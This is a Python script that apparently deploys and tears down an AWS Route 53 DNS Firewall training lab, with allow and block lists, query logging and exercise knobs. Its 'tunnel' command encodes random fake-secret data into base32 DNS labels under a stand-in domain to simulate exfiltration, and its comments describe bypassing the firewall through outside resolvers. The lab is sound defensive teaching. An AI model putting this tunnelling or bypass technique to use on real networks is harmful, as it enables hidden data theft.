#!/usr/bin/env python3
"""NET-019 — Route 53 Resolver DNS Firewall: block exfiltration, allow lists, logging.

deploy                      Create VPC + EC2 (SSM) + PHZ + query logging + DNS Firewall
status                      Show rule group, rules and association state
query NAME [SERVER]         dig NAME from the EC2 (default: VPC resolver)
logs [MINUTES]              Show recent query log entries with firewall fields
block-response MODE         nxdomain | nodata | override  (block-list rule)
allow-priority N            Move the allow-list rule to priority N (Exercise 2)
redirection MODE            trust | inspect  (allow-list rule, CNAME chasing)
tunnel [N]                  Send N exfiltration-style queries (Exercise 4)
egress MODE                 open | lockdown  (SG egress: DNS only to the VPC resolver)
fail-open MODE              enabled | disabled
teardown                    Delete everything and verify

Usage:
    python deploy_lab.py deploy [--profile PROFILE]
"""

import argparse
import base64
import json
import os
import secrets
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError, WaiterError

RESOURCE_FILE = Path(__file__).parent / "resources.json"

REGION = "us-east-1"
PREFIX = "NET-019"
VPC_CIDR = "10.60.0.0/16"
SUBNET_CIDR = "10.60.1.0/24"
VPC_RESOLVER = "10.60.0.2"
LOG_GROUP = "/aws/route53/net019"
PHZ_NAME = "company.internal"

ALLOW_DOMAINS = ["*.amazonaws.com", "company.internal", "*.company.internal"]
BLOCK_DOMAINS = ["c2-lab.example", "*.c2-lab.example"]
MANAGED_LISTS = ["AWSManagedDomainsMalwareDomainList", "AWSManagedDomainsBotnetCommandandControl"]
TUNNEL_DOMAIN = "tunnel-lab.example"     # deliberately NOT in any list: only Advanced can catch it
SINKHOLE = "sinkhole.company.internal"   # walled-garden target for BlockResponse=OVERRIDE

AMI_PARAM = "/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64"
IMDS_OPTS = {"HttpTokens": "required", "HttpEndpoint": "enabled"}
TAGS = [{"Key": "Project", "Value": PREFIX}]


def get_session(profile):
    return boto3.Session(profile_name=profile, region_name=REGION)


def save(r):
    RESOURCE_FILE.write_text(json.dumps(r, indent=2, default=str) + "\n")


def load():
    if RESOURCE_FILE.exists():
        return json.loads(RESOURCE_FILE.read_text())
    return {}


def req_id(name):
    return f"{PREFIX}-{name}-{int(time.time())}"


def spec(resource_type, name):
    return [{"ResourceType": resource_type, "Tags": [{"Key": "Name", "Value": f"{PREFIX}-{name}"}] + TAGS}]


def wait_for(desc, check_fn, timeout=600, interval=10):
    elapsed = 0
    while elapsed < timeout:
        if check_fn():
            return
        print(f"  waiting for {desc}... ({elapsed}s)")
        time.sleep(interval)
        elapsed += interval
    raise TimeoutError(f"Timed out waiting for {desc}")


def run_on_ec2(sess, instance_id, commands, timeout=180):
    ssm = sess.client("ssm")
    cmd_id = ssm.send_command(InstanceIds=[instance_id], DocumentName="AWS-RunShellScript",
                              Parameters={"commands": commands})["Command"]["CommandId"]
    elapsed = 0
    while elapsed < timeout:
        time.sleep(3)
        elapsed += 3
        try:
            inv = ssm.get_command_invocation(CommandId=cmd_id, InstanceId=instance_id)
        except ClientError:
            continue
        if inv["Status"] not in ("Pending", "InProgress", "Delayed"):
            return inv["StandardOutputContent"] + inv["StandardErrorContent"]
    return "(timed out waiting for SSM command)"


def rule_by_name(r53r, r, name):
    rules = r53r.list_firewall_rules(FirewallRuleGroupId=r["rule_group_id"])["FirewallRules"]
    return next(x for x in rules if x["Name"] == name)


# ═══════════════════════════════════════════════════════════════════════════════
#  DEPLOY
# ═══════════════════════════════════════════════════════════════════════════════

def deploy(profile):
    r = load()
    if r:
        print("resources.json exists — run teardown first.")
        return
    sess = get_session(profile)
    ec2 = sess.client("ec2")
    iam = sess.client("iam")
    r53 = sess.client("route53")
    r53r = sess.client("route53resolver")
    logs = sess.client("logs")
    r["account_id"] = sess.client("sts").get_caller_identity()["Account"]

    # ── 1. Network: one public subnet, no inbound anywhere ─────────────────
    # A public IP (not NAT) keeps the lab cheap and makes the Exercise 5 bypass possible:
    # the instance can reach 8.8.8.8 directly unless egress is locked down.
    print("[1/7] VPC, subnet, IGW, security group...")
    r["vpc_id"] = ec2.create_vpc(CidrBlock=VPC_CIDR, TagSpecifications=spec("vpc", "vpc"))["Vpc"]["VpcId"]
    save(r)
    ec2.modify_vpc_attribute(VpcId=r["vpc_id"], EnableDnsSupport={"Value": True})
    ec2.modify_vpc_attribute(VpcId=r["vpc_id"], EnableDnsHostnames={"Value": True})
    az = ec2.describe_availability_zones()["AvailabilityZones"][0]["ZoneName"]
    r["subnet_id"] = ec2.create_subnet(VpcId=r["vpc_id"], CidrBlock=SUBNET_CIDR, AvailabilityZone=az,
                                       TagSpecifications=spec("subnet", "public"))["Subnet"]["SubnetId"]
    ec2.modify_subnet_attribute(SubnetId=r["subnet_id"], MapPublicIpOnLaunch={"Value": True})
    r["igw_id"] = ec2.create_internet_gateway(TagSpecifications=spec("internet-gateway", "igw"))["InternetGateway"]["InternetGatewayId"]
    ec2.attach_internet_gateway(InternetGatewayId=r["igw_id"], VpcId=r["vpc_id"])
    r["rtb_id"] = ec2.create_route_table(VpcId=r["vpc_id"], TagSpecifications=spec("route-table", "public"))["RouteTable"]["RouteTableId"]
    ec2.create_route(RouteTableId=r["rtb_id"], DestinationCidrBlock="0.0.0.0/0", GatewayId=r["igw_id"])
    ec2.associate_route_table(RouteTableId=r["rtb_id"], SubnetId=r["subnet_id"])
    r["sg_id"] = ec2.create_security_group(GroupName=f"{PREFIX}-client", Description="NET-019 client - no inbound",
                                           VpcId=r["vpc_id"], TagSpecifications=spec("security-group", "client"))["GroupId"]
    save(r)

    # ── 2. EC2 client with SSM ─────────────────────────────────────────────
    print("[2/7] IAM role + EC2 client...")
    r["role_name"], r["profile_name"] = f"{PREFIX}-ssm-role", f"{PREFIX}-ssm-profile"
    try:
        iam.create_role(RoleName=r["role_name"], AssumeRolePolicyDocument=json.dumps({
            "Version": "2012-10-17",
            "Statement": [{"Effect": "Allow", "Principal": {"Service": "ec2.amazonaws.com"}, "Action": "sts:AssumeRole"}]}),
            Tags=TAGS)
        iam.attach_role_policy(RoleName=r["role_name"], PolicyArn="arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore")
        iam.create_instance_profile(InstanceProfileName=r["profile_name"])
        iam.add_role_to_instance_profile(InstanceProfileName=r["profile_name"], RoleName=r["role_name"])
    except ClientError as e:
        if e.response["Error"]["Code"] != "EntityAlreadyExists":
            raise
    save(r)
    time.sleep(10)  # IAM propagation
    ami = sess.client("ssm").get_parameter(Name=AMI_PARAM)["Parameter"]["Value"]
    r["instance_id"] = ec2.run_instances(
        ImageId=ami, InstanceType="t3.micro", MinCount=1, MaxCount=1, SubnetId=r["subnet_id"],
        SecurityGroupIds=[r["sg_id"]], IamInstanceProfile={"Name": r["profile_name"]}, MetadataOptions=IMDS_OPTS,
        TagSpecifications=spec("instance", "client"))["Instances"][0]["InstanceId"]
    save(r)

    # ── 3. Query logging ───────────────────────────────────────────────────
    print("[3/7] Resolver query logging...")
    try:
        logs.create_log_group(logGroupName=LOG_GROUP)
    except ClientError as e:
        if e.response["Error"]["Code"] != "ResourceAlreadyExistsException":
            raise
    logs.put_retention_policy(logGroupName=LOG_GROUP, retentionInDays=1)
    r["log_group"] = LOG_GROUP
    lg_arn = f"arn:aws:logs:{REGION}:{r['account_id']}:log-group:{LOG_GROUP}"
    r["qlog_id"] = r53r.create_resolver_query_log_config(
        Name=f"{PREFIX}-querylog", DestinationArn=lg_arn, CreatorRequestId=req_id("qlog"),
        Tags=TAGS)["ResolverQueryLogConfig"]["Id"]
    r53r.associate_resolver_query_log_config(ResolverQueryLogConfigId=r["qlog_id"], ResourceId=r["vpc_id"])
    save(r)

    # ── 4. PHZ for the CNAME-chasing and walled-garden tests ───────────────
    print("[4/7] Private hosted zone company.internal...")
    r["phz_id"] = r53.create_hosted_zone(
        Name=PHZ_NAME, CallerReference=req_id("phz"), VPC={"VPCRegion": REGION, "VPCId": r["vpc_id"]},
        HostedZoneConfig={"Comment": "NET-019 lab", "PrivateZone": True})["HostedZone"]["Id"].split("/")[-1]
    save(r)
    r53.change_resource_record_sets(HostedZoneId=r["phz_id"], ChangeBatch={"Changes": [
        {"Action": "CREATE", "ResourceRecordSet": {"Name": f"app.{PHZ_NAME}", "Type": "A", "TTL": 60,
                                                   "ResourceRecords": [{"Value": "10.60.1.50"}]}},
        {"Action": "CREATE", "ResourceRecordSet": {"Name": SINKHOLE, "Type": "A", "TTL": 60,
                                                   "ResourceRecords": [{"Value": "10.60.1.99"}]}},
        # An allowed internal name that redirects to a blocked domain (Exercise 3)
        {"Action": "CREATE", "ResourceRecordSet": {"Name": f"legit.{PHZ_NAME}", "Type": "CNAME", "TTL": 60,
                                                   "ResourceRecords": [{"Value": "cdn.c2-lab.example"}]}},
    ]})

    # ── 5. Domain lists ────────────────────────────────────────────────────
    print("[5/7] Domain lists...")
    for key, name, domains in [("allow_list_id", "allow", ALLOW_DOMAINS), ("block_list_id", "block", BLOCK_DOMAINS)]:
        r[key] = r53r.create_firewall_domain_list(CreatorRequestId=req_id(name), Name=f"{PREFIX}-{name}",
                                                  Tags=TAGS)["FirewallDomainList"]["Id"]
        save(r)
        r53r.update_firewall_domains(FirewallDomainListId=r[key], Operation="ADD", Domains=domains)
    managed = {d["Name"]: d["Id"] for d in r53r.list_firewall_domain_lists()["FirewallDomainLists"]
               if d.get("ManagedOwnerName")}
    for key, rid in [("allow_list_id", r["allow_list_id"]), ("block_list_id", r["block_list_id"])]:
        wait_for(f"{key} COMPLETE", lambda i=rid: r53r.get_firewall_domain_list(
            FirewallDomainListId=i)["FirewallDomainList"]["Status"] == "COMPLETE", timeout=180)

    # ── 6. Rule group: first match wins, by rule priority ──────────────────
    print("[6/7] Rule group and rules...")
    r["rule_group_id"] = r53r.create_firewall_rule_group(CreatorRequestId=req_id("rg"), Name=f"{PREFIX}-rules",
                                                         Tags=TAGS)["FirewallRuleGroup"]["Id"]
    save(r)
    base = {"FirewallRuleGroupId": r["rule_group_id"]}
    r53r.create_firewall_rule(**base, CreatorRequestId=req_id("r1"), Name="allow-business", Priority=100,
                              Action="ALLOW", FirewallDomainListId=r["allow_list_id"],
                              FirewallDomainRedirectionAction="TRUST_REDIRECTION_DOMAIN")
    r53r.create_firewall_rule(**base, CreatorRequestId=req_id("r2"), Name="block-custom", Priority=200,
                              Action="BLOCK", BlockResponse="NXDOMAIN", FirewallDomainListId=r["block_list_id"])
    for i, name in enumerate(MANAGED_LISTS):
        r53r.create_firewall_rule(**base, CreatorRequestId=req_id(f"m{i}"), Name=f"block-{name[17:].lower()}",
                                  Priority=300 + i * 10, Action="BLOCK", BlockResponse="NXDOMAIN",
                                  FirewallDomainListId=managed[name])
    # DNS Firewall Advanced: behavioral detection, no domain list
    r53r.create_firewall_rule(**base, CreatorRequestId=req_id("t"), Name="alert-dns-tunneling", Priority=400,
                              Action="ALERT", DnsThreatProtection="DNS_TUNNELING", ConfidenceThreshold="LOW")
    r53r.create_firewall_rule(**base, CreatorRequestId=req_id("g"), Name="alert-dga", Priority=410,
                              Action="ALERT", DnsThreatProtection="DGA", ConfidenceThreshold="LOW")

    # ── 7. Associate with the VPC ──────────────────────────────────────────
    print("[7/7] Associating rule group with the VPC...")
    r["association_id"] = r53r.associate_firewall_rule_group(
        CreatorRequestId=req_id("assoc"), FirewallRuleGroupId=r["rule_group_id"], VpcId=r["vpc_id"],
        Priority=101, Name=f"{PREFIX}-assoc", Tags=TAGS)["FirewallRuleGroupAssociation"]["Id"]
    save(r)
    wait_for("rule group association COMPLETE", lambda: r53r.get_firewall_rule_group_association(
        FirewallRuleGroupAssociationId=r["association_id"])["FirewallRuleGroupAssociation"]["Status"] == "COMPLETE")
    ec2.get_waiter("instance_running").wait(InstanceIds=[r["instance_id"]])
    print("\n✅ Deploy complete. Wait ~2 min for SSM, then: python deploy_lab.py status")


# ═══════════════════════════════════════════════════════════════════════════════
#  STATUS / QUERY / LOGS
# ═══════════════════════════════════════════════════════════════════════════════

def status(profile, _=None):
    r = load()
    sess = get_session(profile)
    r53r = sess.client("route53resolver")
    assoc = r53r.get_firewall_rule_group_association(FirewallRuleGroupAssociationId=r["association_id"])["FirewallRuleGroupAssociation"]
    print(f"Association: priority {assoc['Priority']} · {assoc['Status']}")
    for x in sorted(r53r.list_firewall_rules(FirewallRuleGroupId=r["rule_group_id"])["FirewallRules"], key=lambda x: x["Priority"]):
        extra = x.get("BlockResponse", "") if x["Action"] == "BLOCK" else ""
        if x.get("DnsThreatProtection"):
            extra = f"{x['DnsThreatProtection']} ({x.get('ConfidenceThreshold')})"
        if x.get("FirewallDomainRedirectionAction") and x["Action"] == "ALLOW":
            extra = x["FirewallDomainRedirectionAction"]
        print(f"  {x['Priority']:>4}  {x['Action']:<6} {x['Name']:<28} {extra}")
    cfg = r53r.get_firewall_config(ResourceId=r["vpc_id"])["FirewallConfig"]
    print(f"Fail open: {cfg['FirewallFailOpen']}")
    ssm = sess.client("ssm").describe_instance_information(
        Filters=[{"Key": "InstanceIds", "Values": [r["instance_id"]]}])["InstanceInformationList"]
    print(f"EC2 {r['instance_id']} SSM: {ssm[0]['PingStatus'] if ssm else 'not registered yet'}")


def query(profile, args):
    r = load()
    name = args[0]
    server = f"@{args[1]}" if len(args) > 1 else ""
    out = run_on_ec2(get_session(profile), r["instance_id"], [
        f"dig {server} {name} +tries=1 +time=4 | grep -E 'status:|ANSWER SECTION|IN\\s+(A|CNAME)\\s|SERVER:|timed out'"])
    print(out.strip())


def show_logs(profile, args):
    r = load()
    minutes = int(args[0]) if args else 10
    q = ("fields @timestamp, query_name, query_type, rcode, firewall_rule_action, firewall_rule_group_id, "
         "firewall_domain_list_id, firewall_protection, answers.0.Rdata | sort @timestamp desc | limit 40")
    c = get_session(profile).client("logs")
    end = int(time.time())
    qid = c.start_query(logGroupName=r["log_group"], startTime=end - minutes * 60, endTime=end, queryString=q)["queryId"]
    while (res := c.get_query_results(queryId=qid))["status"] in ("Running", "Scheduled"):
        time.sleep(2)
    for row in res["results"]:
        d = {x["field"]: x["value"] for x in row if x["field"] != "@ptr"}
        print(f"{d['@timestamp'][11:19]} {d.get('query_type', ''):<5} {d.get('query_name', ''):<60} "
              f"{d.get('rcode', ''):<9} {d.get('firewall_rule_action', '-'):<6} "
              f"{d.get('firewall_protection', '')} {d.get('answers.0.Rdata', '')}")


# ═══════════════════════════════════════════════════════════════════════════════
#  EXERCISE KNOBS
# ═══════════════════════════════════════════════════════════════════════════════

def block_response(profile, args):
    r = load()
    r53r = get_session(profile).client("route53resolver")
    rule = rule_by_name(r53r, r, "block-custom")
    mode = args[0].upper()
    kw = {"BlockResponse": mode}
    if mode == "OVERRIDE":
        kw.update(BlockOverrideDomain=SINKHOLE, BlockOverrideDnsType="CNAME", BlockOverrideTtl=60)
    r53r.update_firewall_rule(FirewallRuleGroupId=r["rule_group_id"], FirewallDomainListId=rule["FirewallDomainListId"],
                              Action="BLOCK", **kw)
    print(f"block-custom → BlockResponse={mode}. Allow ~1 min to propagate.")


def allow_priority(profile, args):
    r = load()
    r53r = get_session(profile).client("route53resolver")
    rule = rule_by_name(r53r, r, "allow-business")
    r53r.update_firewall_rule(FirewallRuleGroupId=r["rule_group_id"], FirewallDomainListId=rule["FirewallDomainListId"],
                              Priority=int(args[0]))
    print(f"allow-business → priority {args[0]} (block-custom is 200). Allow ~1 min to propagate.")


def redirection(profile, args):
    r = load()
    r53r = get_session(profile).client("route53resolver")
    rule = rule_by_name(r53r, r, "allow-business")
    mode = {"trust": "TRUST_REDIRECTION_DOMAIN", "inspect": "INSPECT_REDIRECTION_DOMAIN"}[args[0]]
    r53r.update_firewall_rule(FirewallRuleGroupId=r["rule_group_id"], FirewallDomainListId=rule["FirewallDomainListId"],
                              FirewallDomainRedirectionAction=mode)
    print(f"allow-business → {mode}. Allow ~1 min to propagate.")


def tunnel(profile, args):
    """Encode a fake secret into DNS labels the way exfiltration tools do (base32, <=63 chars per label)."""
    r = load()
    n = int(args[0]) if args else 60
    secret = secrets.token_bytes(24 * n)
    chunks = base64.b32encode(secret).decode().rstrip("=").lower()
    names = []
    for i in range(n):
        piece = chunks[i * 38:(i + 1) * 38]
        names.append(f"{piece[:19]}.{piece[19:]}.s{i}.{TUNNEL_DOMAIN}")
    cmds = ["for q in " + " ".join(names) + "; do dig +short +tries=1 +time=2 TXT $q >/dev/null; done", "echo sent"]
    print(f"Sending {n} exfiltration-style queries to *.{TUNNEL_DOMAIN}, e.g. {names[0]}")
    print(run_on_ec2(get_session(profile), r["instance_id"], cmds, timeout=600).strip())
    print("Check with: python deploy_lab.py logs 15")


def egress(profile, args):
    """lockdown: SG egress allows only DNS to the VPC resolver and HTTPS (SSM). open: allow all."""
    r = load()
    ec2 = get_session(profile).client("ec2")
    if args[0] == "open":
        perms = [{"IpProtocol": "-1", "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}]
    else:
        perms = [{"IpProtocol": p, "FromPort": 53, "ToPort": 53,
                  "IpRanges": [{"CidrIp": f"{VPC_RESOLVER}/32", "Description": "DNS only via VPC resolver"}]}
                 for p in ("udp", "tcp")]
        perms.append({"IpProtocol": "tcp", "FromPort": 443, "ToPort": 443,
                      "IpRanges": [{"CidrIp": "0.0.0.0/0", "Description": "HTTPS for SSM - also carries DoH"}]})
    # Authorize the new rules before revoking the old ones, so a failure never leaves the instance
    # with no egress (which would also cut SSM)
    try:
        ec2.authorize_security_group_egress(GroupId=r["sg_id"], IpPermissions=perms)
    except ClientError as e:
        if e.response["Error"]["Code"] != "InvalidPermission.Duplicate":
            raise
    wanted = {(p["IpProtocol"], p.get("FromPort"), p["IpRanges"][0]["CidrIp"]) for p in perms}
    current = ec2.describe_security_groups(GroupIds=[r["sg_id"]])["SecurityGroups"][0]["IpPermissionsEgress"]
    stale = [p for p in current
             if not p.get("IpRanges") or (p["IpProtocol"], p.get("FromPort"), p["IpRanges"][0]["CidrIp"]) not in wanted]
    if stale:
        ec2.revoke_security_group_egress(GroupId=r["sg_id"], IpPermissions=stale)
    print(f"SG egress → {args[0]}")


def fail_open(profile, args):
    r = load()
    get_session(profile).client("route53resolver").update_firewall_config(
        ResourceId=r["vpc_id"], FirewallFailOpen=args[0].upper())
    print(f"FirewallFailOpen → {args[0].upper()}")


# ═══════════════════════════════════════════════════════════════════════════════
#  TEARDOWN
# ═══════════════════════════════════════════════════════════════════════════════

def teardown(profile, _=None):
    r = load()
    if not r:
        print("No resources.json.")
        return
    sess = get_session(profile)
    ec2, iam, r53, r53r, logs = (sess.client(s) for s in ("ec2", "iam", "route53", "route53resolver", "logs"))
    failures = []

    def safe(fn, *a, **kw):
        try:
            return fn(*a, **kw)
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if "NotFound" in code or code.startswith("NoSuch"):
                return None
            print(f"  (failed: {e})")
            failures.append(str(e))
        except WaiterError as e:
            print(f"  (failed: {e})")
            failures.append(str(e))
        return None

    def wait_until(desc, done_fn, timeout=600, interval=10):
        elapsed = 0
        while elapsed < timeout:
            try:
                if done_fn():
                    return True
            except ClientError as e:
                if "NotFound" in e.response["Error"]["Code"]:
                    return True
            print(f"  waiting for {desc}... ({elapsed}s)")
            time.sleep(interval)
            elapsed += interval
        failures.append(f"timeout: {desc}")
        return False

    print("Disassociating DNS Firewall rule group...")
    if r.get("association_id"):
        safe(r53r.disassociate_firewall_rule_group, FirewallRuleGroupAssociationId=r["association_id"])
        wait_until("rule group disassociation", lambda: not r53r.list_firewall_rule_group_associations(
            VpcId=r["vpc_id"])["FirewallRuleGroupAssociations"])

    print("Deleting rules, rule group and domain lists...")
    if r.get("rule_group_id"):
        for x in safe(lambda: r53r.list_firewall_rules(FirewallRuleGroupId=r["rule_group_id"])["FirewallRules"]) or []:
            kw = {"FirewallDomainListId": x["FirewallDomainListId"]} if x.get("FirewallDomainListId") else \
                 {"FirewallThreatProtectionId": x["FirewallThreatProtectionId"]}
            safe(r53r.delete_firewall_rule, FirewallRuleGroupId=r["rule_group_id"], **kw)
        safe(r53r.delete_firewall_rule_group, FirewallRuleGroupId=r["rule_group_id"])
    for key in ("allow_list_id", "block_list_id"):
        if r.get(key):
            safe(r53r.delete_firewall_domain_list, FirewallDomainListId=r[key])

    print("Removing query logging...")
    if r.get("qlog_id"):
        safe(r53r.disassociate_resolver_query_log_config, ResolverQueryLogConfigId=r["qlog_id"], ResourceId=r["vpc_id"])
        wait_until("query log disassociation", lambda: not r53r.list_resolver_query_log_config_associations(
            Filters=[{"Name": "ResolverQueryLogConfigId", "Values": [r["qlog_id"]]}])["ResolverQueryLogConfigAssociations"])
        safe(r53r.delete_resolver_query_log_config, ResolverQueryLogConfigId=r["qlog_id"])
    if r.get("log_group"):
        safe(logs.delete_log_group, logGroupName=r["log_group"])

    print("Deleting private hosted zone...")
    if r.get("phz_id"):
        rrsets = safe(lambda: r53.list_resource_record_sets(HostedZoneId=r["phz_id"])["ResourceRecordSets"]) or []
        changes = [{"Action": "DELETE", "ResourceRecordSet": x} for x in rrsets if x["Type"] not in ("SOA", "NS")]
        if changes:
            safe(r53.change_resource_record_sets, HostedZoneId=r["phz_id"], ChangeBatch={"Changes": changes})
        safe(r53.delete_hosted_zone, Id=r["phz_id"])

    print("Terminating EC2...")
    if r.get("instance_id"):
        safe(ec2.terminate_instances, InstanceIds=[r["instance_id"]])
        safe(ec2.get_waiter("instance_terminated").wait, InstanceIds=[r["instance_id"]])

    print("Cleaning up IAM...")
    if r.get("profile_name"):
        safe(iam.remove_role_from_instance_profile, InstanceProfileName=r["profile_name"], RoleName=r["role_name"])
        safe(iam.delete_instance_profile, InstanceProfileName=r["profile_name"])
    if r.get("role_name"):
        for pol in safe(lambda: iam.list_attached_role_policies(RoleName=r["role_name"])["AttachedPolicies"]) or []:
            safe(iam.detach_role_policy, RoleName=r["role_name"], PolicyArn=pol["PolicyArn"])
        for name in safe(lambda: iam.list_role_policies(RoleName=r["role_name"])["PolicyNames"]) or []:
            safe(iam.delete_role_policy, RoleName=r["role_name"], PolicyName=name)
        safe(iam.delete_role, RoleName=r["role_name"])

    print("Deleting VPC...")
    if r.get("vpc_id"):
        flt = [{"Name": "vpc-id", "Values": [r["vpc_id"]]}]
        # GuardDuty Runtime Monitoring may add a guardduty-data endpoint to VPCs with EC2
        eps = safe(lambda: [e["VpcEndpointId"] for e in ec2.describe_vpc_endpoints(Filters=flt)["VpcEndpoints"]
                            if e["State"] not in ("deleted", "deleting")]) or []
        if eps:
            print(f"  deleting VPC endpoints not created by the lab: {eps}")
            safe(ec2.delete_vpc_endpoints, VpcEndpointIds=eps)
        if wait_until("ENIs to be released", lambda: not ec2.describe_network_interfaces(Filters=flt)["NetworkInterfaces"]):
            if r.get("igw_id"):
                safe(ec2.detach_internet_gateway, InternetGatewayId=r["igw_id"], VpcId=r["vpc_id"])
                safe(ec2.delete_internet_gateway, InternetGatewayId=r["igw_id"])
            for sn in safe(lambda: ec2.describe_subnets(Filters=flt)["Subnets"]) or []:
                safe(ec2.delete_subnet, SubnetId=sn["SubnetId"])
            for rt in safe(lambda: ec2.describe_route_tables(Filters=flt)["RouteTables"]) or []:
                if not any(a.get("Main") for a in rt["Associations"]):
                    safe(ec2.delete_route_table, RouteTableId=rt["RouteTableId"])
            for sg in safe(lambda: ec2.describe_security_groups(Filters=flt)["SecurityGroups"]) or []:
                if sg["GroupName"] != "default":
                    safe(ec2.delete_security_group, GroupId=sg["GroupId"])
            safe(ec2.delete_vpc, VpcId=r["vpc_id"])

    if failures:
        print(f"\n⚠️  Teardown finished with {len(failures)} problem(s). resources.json kept — run teardown again.")
        return
    RESOURCE_FILE.unlink(missing_ok=True)
    print("\n✅ Teardown complete.")


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    commands = {"deploy": deploy, "status": status, "query": query, "logs": show_logs,
                "block-response": block_response, "allow-priority": allow_priority, "redirection": redirection,
                "tunnel": tunnel, "egress": egress, "fail-open": fail_open, "teardown": teardown}
    parser = argparse.ArgumentParser(description="NET-019 DNS Firewall lab")
    parser.add_argument("command", choices=list(commands))
    parser.add_argument("args", nargs="*")
    parser.add_argument("--profile", default=os.environ.get("AWS_PROFILE", "lab975"))
    a = parser.parse_args()
    if a.command == "deploy":
        deploy(a.profile)
    else:
        commands[a.command](a.profile, a.args)


if __name__ == "__main__":
    main()
